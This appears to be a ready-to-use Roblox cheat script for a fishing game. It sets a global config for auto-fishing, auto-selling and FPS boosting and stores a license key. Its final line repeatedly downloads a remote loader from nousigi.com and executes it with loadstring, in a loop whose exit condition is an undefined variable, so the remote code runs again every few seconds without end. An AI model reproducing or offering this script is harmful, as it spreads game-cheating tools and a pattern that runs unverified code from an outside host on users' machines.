repeat task.wait() until game:IsLoaded()
game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
getgenv().Config = {
	["Character"] = {
		["Disable Swim"] = true
	},
	["Auto Sell"] = {
		["Enable"] = true,
		["Delay"] = 1
	},
	["Performance"] = {
		["Boost FPS"] = true
        
	},
	["Auto Fish"] = {
		["Fish Location"] = {
			["Auto"] = true,
			["Zone"] = "Desolate Deep"
		},
		["Cast Threshold"] = 95,
		["Perfect Chance"] = 90,
		["Enable"] = true,
		["Fail Chance"] = 5
	},
	["AutoSave"] = true
}
getgenv().Key = "wPfsNXRRMazroqcwmxPIUwPcGvwkRZer"
repeat wait(2)spawn(function()loadstring(game:HttpGet("https://nousigi.com/loader.lua"))()end)wait(6)until Joebiden